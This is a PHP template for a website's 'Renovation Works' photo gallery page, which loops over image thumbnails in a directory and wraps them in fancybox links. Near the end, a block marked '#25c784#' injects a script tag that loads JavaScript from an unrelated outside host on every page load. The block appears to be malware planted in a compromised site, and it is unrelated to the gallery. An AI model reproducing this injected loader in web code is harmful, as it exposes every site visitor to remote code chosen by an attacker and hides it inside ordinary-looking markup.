<?php include "inc/header.php";?>		
<!-- Highlights -->
<section class="wrapper gallery">
	<div class="container ">
		<h3>Renovation Works</h3>
		<?php
			$dir1    = 'gallery/renovation_works/thumb';
			$dir2    = 'gallery/renovation_works';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%4 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="3u 12u(4)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>"><img src="<?php echo $dir1."/".$img ?>" alt="" /></a>
			</section>
		<?php
		$len++;
		if($len%4 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
<?php
#25c784#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11968099\"></script>";
echo $g;
}
#/25c784#
?>	</div>
</section>
<section class="wrapper strip_line">
</section>
<!-- Footer -->
<?php include "inc/footer.php";?>